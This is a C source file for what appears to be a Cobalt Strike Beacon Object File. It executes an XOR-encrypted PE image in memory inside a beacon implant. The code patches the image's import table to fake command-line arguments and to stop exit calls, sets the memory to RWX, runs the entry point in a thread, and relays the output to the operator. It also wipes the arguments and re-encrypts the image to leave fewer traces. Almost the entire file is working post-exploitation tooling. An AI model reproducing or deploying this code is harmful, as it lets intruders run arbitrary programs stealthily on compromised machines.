#include "bofdefs.h"
#include "beacon.h"

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS
#define BUFFER_SIZE 8192
#define _WAIT_TIMEOUT 5000

//cmdline args vars
BOOL hijackCmdline = FALSE;
char *sz_masqCmd_Ansi = NULL;
char *sz_masqCmd_ArgvAnsi[100];
wchar_t *sz_masqCmd_Widh = NULL;
wchar_t *sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs *pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;

//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
	return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{ 
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
	return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
	return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
	return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
	return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvW;

	return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvA;

	return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
	return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
	return 0;
}

int __cdecl hookexit(int status)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
	//_cexit() causes cmd.exe to break for reasons unknown...
	ExitThread(0);
	return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
	ExitThread(0);
}

//-----Have to redefine __acrt_iob_func and stdin/stdout/stderr due to CS inability to resolve __acrt_iob_func-----

FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))


//This function handles transforming the basic Ansi cmdline string from CS into all of the different formats that might be required by a PE
void masqueradeCmdline()
{
	//Convert cmdline to widestring
	int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
	sz_masqCmd_Widh = calloc(required_size + 1, sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

	//Create widestring array of pointers
	poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

	//Manual function equivalent for CommandLineToArgvA
	int retval;
	int memsize = int_masqCmd_Argc * sizeof(LPSTR);
	for (int i = 0; i < int_masqCmd_Argc; ++ i)
	{
		retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
		memsize += retval;
	}

	poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

	int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
	LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
	for (int i = 0; i < int_masqCmd_Argc; ++ i)
	{
		retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
		poi_masqArgvA[i] = buffer;
		buffer += retval;
		bufLen -= retval;
	}

	hijackCmdline = TRUE;
}


//-------These next two functions necessary to zero-out/free the char*/wchar_t* arrays holding cmdline args--------

//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
	//Wipe cmdline args from beacon memory
	for (int i = 0; i < Argc; i++)
	{
		memset(array[i], 0, strlen(array[i]));
	}
	LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
	//Wipe cmdline args from beacon memory
	for (int i = 0; i < Argc; i++)
	{
		memset(array[i], 0, wcslen(array[i]) * 2);
	}
	LocalFree(array);
}

//This function XOR's/un-XOR's PE in memory
void xorPE(char* pImageBase, DWORD sizeofimage, char* key)
{
	//Copy key into char array for easier use in XOR function
	char temp[100] = {0};
	memcpy(temp, key, strlen(key));

	DWORD a = 0;

	while (a < sizeofimage) {
		//If byte isn't null, we xor it
		if(*(pImageBase + a) != 0x00) //if((*(pImageBase + a) != 0x00 ) && (*(pImageBase + a) ^ temp[a % strlen(temp)] != 0x00))
		{
			//XOR byte using key
			*(pImageBase + a) ^= temp[a % strlen(temp)];

			//If resulting byte is a null byte, we xor back to original
			if(*(pImageBase + a) == 0x00)
			{
				*(pImageBase + a) ^= temp[a % strlen(temp)];
			}
		}
		a++;
	}
	memset(temp, 0, strlen(key));
	return;
}


//-------------------------These functions related to parsing PE and fixing the IAT of PE -------------------------

BYTE* getNtHdrs(BYTE* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (BYTE*)inh;
}

IMAGE_DATA_DIRECTORY* getPeDir(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

//Fix IAT in manually mapped PE.  This is where we hook certain API's and redirect calls to them to our above defined functions.
BOOL fixIAT(PVOID modulePtr)
{
	IMAGE_DATA_DIRECTORY* importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (importsDir == NULL) return FALSE;

	size_t maxSize = importsDir->Size;
	size_t impAddr = importsDir->VirtualAddress;

	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
	size_t parsedSize = 0;

	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
		LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
		//This BeaconPrintf will list every DLL imported by PE (but not those loaded by other DLL's...)
		//BeaconPrintf(CALLBACK_OUTPUT, "    [+] Import DLL: %s\n", lib_name);

		size_t call_via = lib_desc->FirstThunk;
		size_t thunk_addr = lib_desc->OriginalFirstThunk;
		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

		size_t offsetField = 0;
		size_t offsetThunk = 0;
		while (TRUE)
		{
			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)((size_t)(modulePtr) + offsetField + call_via);
			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)((size_t)(modulePtr) + offsetThunk + thunk_addr);

			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
			{
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
				fieldThunk->u1.Function = addr;
				//This BeaconPrintf will list api's imported by ordinal
				//BeaconPrintf(CALLBACK_OUTPUT, "        [V] API %x at %x\n", orginThunk->u1.Ordinal, addr);
			}

			if (fieldThunk->u1.Function == NULL)
				break;

			if(fieldThunk->u1.Function == orginThunk->u1.Function)
			{
				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr) + orginThunk->u1.AddressOfData);
				LPSTR func_name = (LPSTR)by_name->Name;
				
				size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
				//This BeaconPrintf will list api's imported by name
				//BeaconPrintf(CALLBACK_OUTPUT, "        [V] API %s at %x\n", func_name, addr);

				//We have to hook several functions in order to run our PE.
				//GetCommandLineA, GetCommandLineW, __getmainargs, __wgetmainargs, __p___argv, __p___wargv, __p___argc all relate to providing cmdline args to PE
				//exit, _Exit, _exit, quick_exit, and ExitProcess must be hooked so that when they are called we don't exit our beacon...

				if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__getmainargs;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argv;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___wargv;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
				{
					fieldThunk->u1.Function = (size_t)hook__p___argc;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
				{
					fieldThunk->u1.Function = (size_t)hookexit;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
				{
					fieldThunk->u1.Function = (size_t)hookExitProcess;
					//BeaconPrintf(CALLBACK_OUTPUT, "Hooked: %s\n", func_name);
				}
				else
					fieldThunk->u1.Function = addr;

			}
			offsetField += sizeof(IMAGE_THUNK_DATA);
			offsetThunk += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL peRun(char* key)
{

	//Decrypt PE in memory
	xorPE(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, key);

	//format and/or hook commandline args
	masqueradeCmdline();

	//Remap API's
	fixIAT((VOID*)pMemAddrs->pImageBase);

	//Make PE executable.  Note that RWX seems to be necessary here, using RX caused crashes. Maybe to do with parsing cmdline args?
	DWORD dwOldProtect;
	VirtualProtect(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//Get timestamp immediately before running PE for comparison later
	LARGE_INTEGER frequency, before, after;
	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&before);

	//Run PE
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(pMemAddrs->pImageBase + pMemAddrs->AddressOfEntryPoint), 0, 0, 0);


//-----We now have to collect output from PE.  This is done in a loop in order to continue reading from pipe.------

    DWORD remainingDataOutput = 0;
	DWORD waitResult = -1;
    BOOL isThreadFinished = FALSE;
	DWORD bytesRead = 0;
	BOOL aborted = FALSE;

	//Allocate buffer to hold output from PE
	unsigned char* recvBuffer = calloc(BUFFER_SIZE, sizeof(unsigned char));

	do {	
		//Get current time
		QueryPerformanceCounter(&after);

		//Calculate elapsed time since thread started; if it exceeds our timeout, we want to bail out of execution and terminate the PE.
		if (((after.QuadPart - before.QuadPart) / frequency.QuadPart) > dwTimeout)
		{			
			//Kill PE thread
			TerminateThread(hThread, 0);

			//If we hit bailout condition we assume that something went wrong during execution
			//This often means that the FILE* we get (fout/ferr) after reopening stdout/stderr are hanging/messed up and cannot be closed
			//We must instruct peunload not to attempt to close these FILE* or we will lose comms with our Beacon
			pMemAddrs->bCloseFHandles = FALSE;
			aborted = TRUE;
		}

		//Wait for PE thread completion
		waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);
		switch (waitResult) {
		case WAIT_ABANDONED:
			break;
		case WAIT_FAILED:
			break;
		case _WAIT_TIMEOUT:
			break;
		case WAIT_OBJECT_0:
			isThreadFinished = TRUE;
		}

		//See if/how much data is available to be read from pipe
		PeekNamedPipe((VOID*)pMemAddrs->hreadout, NULL, 0, NULL, &remainingDataOutput, NULL);
		//BeaconPrintf(CALLBACK_OUTPUT, "Peek bytes available: %d!\nGetLastError: %d", remainingDataOutput, GetLastError());

		//If there is data to be read, zero out buffer, read data, and send back to CS
		if (remainingDataOutput) {
			memset(recvBuffer, 0, BUFFER_SIZE);
			bytesRead = 0;
			ReadFile( (VOID*)pMemAddrs->hreadout, recvBuffer, BUFFER_SIZE - 1, &bytesRead, NULL);

			//Send output back to CS
			BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);

		}
	} while (!isThreadFinished || remainingDataOutput);

	//Free results buffer
	free(recvBuffer);
	
	//Free cmdline memory
	free(sz_masqCmd_Widh);
	freeargvA(poi_masqArgvA, int_masqCmd_Argc);
	freeargvW(poi_masqArgvW, int_masqCmd_Argc);

	//Revert memory protections on PE back to RW
	VirtualProtect(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, dwOldProtect, &dwOldProtect);

	//Refresh mapped PE with backup in order to restore to original state (and XOR encrypted again).
	memcpy(pMemAddrs->pImageBase, pMemAddrs->pBackupImage, pMemAddrs->SizeOfImage);

	//If we hit timeout on PE and killed it, let CS know.
	if(aborted)
		BeaconPrintf(CALLBACK_OUTPUT, "perun timeout");
	else
		BeaconPrintf(CALLBACK_OUTPUT, "perun complete");
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	int dataextracted = 0;

	char* key = BeaconDataExtract(&parser, &dataextracted);
	char* pMemAddrstr = BeaconDataExtract(&parser, &dataextracted);
	sz_masqCmd_Ansi = BeaconDataExtract(&parser, &dataextracted);
	dwTimeout = BeaconDataInt(&parser);

	/* //Debug
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg key is: %s", key);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg pMemAddrstr is: %s", pMemAddrstr);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg cmdline is: %s", sz_masqCmd_Ansi);
	BeaconPrintf(CALLBACK_OUTPUT, "beaconarg dwTimeout is: %d", dwTimeout);
	*/

	//Associate pMemAddrs struct with address passed from CS
    char* pEnd;
	pMemAddrs = (struct MemAddrs*)_strtoi64(pMemAddrstr, &pEnd, 10);
	//BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs is: %p!", pMemAddrs);

	/* //Debug
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->pImageBase is: %p!", pMemAddrs->pImageBase);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->pBackupImage is: %p!", pMemAddrs->pBackupImage);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->AddressOfEntryPoint: %d!", pMemAddrs->AddressOfEntryPoint);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->SizeOfImage: %d!", pMemAddrs->SizeOfImage);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->fout: %p!", pMemAddrs->fout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->ferr: %p!", pMemAddrs->ferr);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->hreadout: %p!", pMemAddrs->hreadout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->hwriteout: %p!", pMemAddrs->hwriteout);
	BeaconPrintf(CALLBACK_OUTPUT, "pMemAddrs->fo: %d!", pMemAddrs->fo);
	*/

	//Run PE
	peRun(key);

	return 0;
}